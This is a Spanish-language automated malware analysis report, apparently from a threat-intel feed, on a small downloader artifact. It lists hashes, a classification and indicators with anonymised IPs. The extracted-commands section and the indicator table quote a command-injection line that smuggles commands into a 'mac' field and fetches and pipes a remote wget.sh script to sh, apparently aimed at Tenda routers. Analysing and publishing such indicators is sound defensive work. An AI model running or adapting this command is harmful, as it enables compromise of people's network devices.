# 🧬 Payload Analysis

`1d11c6e1043256f3742335e57d49278fd7d212e1aaa81463a3ebf3a2168a1660`

## 📌 Resumen

Artefacto identificado como ASCII text, with CRLF line terminators de 325 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:49:46.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `1d11c6e1043256f3742335e57d49278fd7d212e1aaa81463a3ebf3a2168a1660`
- **SHA1:** `850ed1be25b6dea68b4ef0b23b5d4be21dd231fd`
- **MD5:** `f0e37826d9774613addea35e86357088`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 325 B |
| Entropía | 5.19 |
| Strings | 6 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=5

## 🖥️ Comandos observados / extraídos

```text
mac=;cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-|sh -s tendaac6;busybox wget hxxp://91.92.40.XXX/wget.sh -O-|sh -s tend
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://91.92.40.XXX/wget.sh | strings |
| ip | 190.179.139.XXX | static_analysis |
| ip | 91.92.40.XXX | static_analysis |
| command | mac=;cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-\|sh -s tendaac6;busybox wget hxxp://91.92.40.XXX/wget.sh -O-\|sh -s tend | strings |
| hash | 1d11c6e1043256f3742335e57d49278fd7d212e1aaa81463a3ebf3a2168a1660 | static_analysis |
| ip | 45.153.34.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
